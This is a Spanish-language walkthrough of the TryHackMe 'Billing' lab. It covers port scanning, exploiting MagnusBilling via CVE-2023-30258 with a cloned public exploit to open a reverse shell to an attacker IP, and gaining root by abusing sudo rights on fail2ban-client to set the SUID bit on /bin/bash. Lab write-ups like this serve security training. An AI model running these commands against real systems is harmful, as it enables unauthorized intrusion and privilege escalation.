---
description: '✍️ Autor: tryhackme, RunasRs 🔍 Dificultad: Fácil'
---

# Billing

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.118.35
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap 10.10.118.35
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo el puerto **22** perteneciente al servicio **SSH,** el puerto **80** perteneciente al servicio **HTTP** y el puerto **3306** perteneciente a **MySQL** están abiertos, por lo que se procederá a indagar más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80,3306 -v 10.10.118.35
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Revisamos el puerto 80.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-20 213144.png" alt=""><figcaption></figcaption></figure>

Es un panel de **MagnusBilling** por lo que ahora haremos un escaneo de directorios por si hay algo relevante.

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml,js -u http://10.10.118.35
```

Encontramos un directorio interesante donde nos menciona la versión y así poder encontrar vulnerabilidad.&#x20;

<div><figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure> <figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-20 215053.png" alt=""><figcaption></figcaption></figure></div>

### 🚀 **EXPLOTACIÓN**

{% @github-files/github-code-block url="https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit" %}

```
git clone https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit.git
cd CVE-2023-30258-magnus-billing-v7-exploit
```

Realizamos la Reverse Shell.

```
nc -nlvp 4444
python3 exploit.py -t 10.10.118.35 -a 10.8.146.101 -p 4444
```

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Hacemos tratamiento de la TTY.

```
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Tenemos permiso sudo del binario **fail2ban-client**.

{% embed url="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-client-privilege-escalation/" %}

```bash
sudo /usr/bin/fail2ban-client status
sudo /usr/bin/fail2ban-client get ast-cli-attck actions
sudo /usr/bin/fail2ban-client set ast-cli-attck addaction evil
sudo /usr/bin/fail2ban-client set ast-cli-attck action evil actionban "chmod +s /bin/bash"
sudo /usr/bin/fail2ban-client set ast-cli-attck banip 1.2.3.5
/bin/bash -p
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
